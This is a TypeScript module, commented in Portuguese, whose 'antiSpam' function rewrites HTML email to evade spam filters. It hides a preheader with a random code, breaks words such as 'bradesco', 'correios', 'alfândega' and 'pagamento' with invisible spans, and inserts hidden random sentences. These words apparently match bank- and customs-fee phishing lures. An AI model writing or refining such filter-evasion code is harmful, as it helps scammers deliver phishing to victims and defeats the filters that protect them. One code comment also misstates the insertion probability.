import * as cheerio from 'cheerio';
import fs from 'fs';
import path from 'path';

// Caminho para o arquivo JSON de frases (sentences)
const sentencesPath = path.join(process.cwd(), 'sentences.json');

/**
 * Função genérica para carregar e parsear arquivos JSON.
 * Lança erro se o arquivo não existir, não for um array ou estiver vazio.
 */
function loadJsonFile<T>(filePath: string): T {
    try {
        if (!fs.existsSync(filePath)) {
            throw new Error(`Arquivo não encontrado: ${filePath}`);
        }

        const data = fs.readFileSync(filePath, 'utf-8');
        const parsed: T = JSON.parse(data);

        if (!Array.isArray(parsed) || parsed.length === 0) {
            throw new Error(`Arquivo ${filePath} deve conter um array não vazio.`);
        }

        console.log(`Arquivo carregado com sucesso: ${filePath}`);
        return parsed;
    } catch (error) {
        console.error(`Erro ao carregar ${filePath}: ${(error as Error).message}`);
        throw error; // Re-lança o erro
    }
}

// Carrega as frases do arquivo JSON
let sentencesArray: string[] = [];
try {
    sentencesArray = loadJsonFile<string[]>(sentencesPath);
} catch (error) {
    console.error(`Usando frases padrão devido ao erro: ${(error as Error).message}`);
    sentencesArray = ["Frase padrão de fallback se der erro."];
}

/**
 * Gera data/hora de Brasília (UTC-3) formatada (DD/MM/YYYY HH:mm:ss).
 */
function getBrasiliaDateTime(): string {
    const now = new Date();

    // Converte 'now' para UTC
    const utcTime = now.getTime() + (now.getTimezoneOffset() * 60000);

    // Ajusta para UTC-3 (Brasília)
    const brasiliaTime = new Date(utcTime - 3 * 3600000);

    const day = String(brasiliaTime.getDate()).padStart(2, '0');
    const month = String(brasiliaTime.getMonth() + 1).padStart(2, '0');
    const year = brasiliaTime.getFullYear();
    const hours = String(brasiliaTime.getHours()).padStart(2, '0');
    const minutes = String(brasiliaTime.getMinutes()).padStart(2, '0');
    const seconds = String(brasiliaTime.getSeconds()).padStart(2, '0');

    return `${day}/${month}/${year} ${hours}:${minutes}:${seconds} (Horário de Brasília)`;
}

/**
 * Gera um código único de 8 caracteres, com um hífen no meio, ex: "AB12-CD34".
 */
function generateProtocol(): string {
    let half1 = '';
    let half2 = '';
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  
    // Gera 4 caracteres
    for (let i = 0; i < 4; i++) {
        half1 += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    // Gera mais 4 caracteres
    for (let i = 0; i < 4; i++) {
        half2 += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    // Retorna no formato AB12-CD34
    return `${half1}-${half2}`;
}

/**
 * Retorna texto do preheader (data/hora + código).
 */
function buildPreheaderText(): string {
    const dateTime = getBrasiliaDateTime();
    const code = generateProtocol();

    // Exemplo: "Data: 24/02/2025 13:00:00 (Horário de Brasília) | Código: AB12-CD34"
    return `Data: ${dateTime} | Código: ${code}\n\n`;
}

/**
 * Cria um span invisível com uma frase aleatória de 'sentencesArray'.
 * A inserção ocorre com uma probabilidade de 80%.
 */
function createInvisibleSpanWithUniqueSentence(): string {
    // 80% de probabilidade
    if (Math.random() > 0.2) return '';

    const randomSentence = sentencesArray[Math.floor(Math.random() * sentencesArray.length)];

    return `<span style="visibility: hidden; position: absolute; font-size: 0;">${randomSentence}</span>`;
}

/**
 * Função principal de anti-spam.
 * 1) Insere preheader invisível (data/hora + código) no <body>
 * 2) Quebra palavras sensíveis com spans invisíveis
 * 3) Insere spans invisíveis antes de palavras aleatórias (80%)
 */
export default function antiSpam(html: string): string {
    if (!html) {
        throw new Error('HTML não pode ser vazio.');
    }

    const $ = cheerio.load(html);

    // 1) Injeta preheader no topo do <body>
    const preheaderText = buildPreheaderText();
    $('body').prepend(`
      <div style="
        font-size:1px;
        color:#ffffff;
        line-height:1px;
        max-height:0px;
        max-width:0px;
        opacity:0;
        overflow:hidden;
        mso-hide:all;
      ">
        ${preheaderText}
      </div>
    `);

    // 2) Lista de palavras sensíveis para "quebrar" letra a letra
    const targetWords = [
        'bradesco',
        'correios',
        'correio',
        'alfândega',
        'pagamento',
        'pagar',
        'retido'
    ];

    // 3) Percorrer nós de texto e inserir spans
    $('*')
      .not('script, style, title, span[style*="position: absolute"]')
      .contents()
      .filter(function () {
          return this.type === 'text' && this.data.trim().length > 0;
      })
      .each(function () {
          const element = $(this);
          const originalText = element.text();

          // Divide em palavras+espaços
          const splitted = originalText.split(/(\s+)/).map((word) => {
              const lower = word.toLowerCase();

              // Se for alvo, quebrar cada letra
              if (targetWords.includes(lower)) {
                  const letters = word.split('');
                  const lettersWithSpans = letters.map(letter => {
                      // Exemplo simples: 1 ou 2 spans a cada 3 letras
                      // (ajuste conforme necessidade)
                      const minSpans = Math.ceil(word.length / 3);
                      let injected = '';
                      for (let i = 0; i < minSpans; i++) {
                          injected += createInvisibleSpanWithUniqueSentence();
                      }
                      return injected + letter;
                  });
                  return lettersWithSpans.join('');
              } else {
                  // Se não for palavra-alvo, inserir 1 span invisível antes da palavra
                  if (word.trim()) {
                      return createInvisibleSpanWithUniqueSentence() + word;
                  }
                  return word; // espaço
              }
          });

          element.replaceWith(splitted.join(''));
      });

    // Retorna HTML final
    return $.html();
}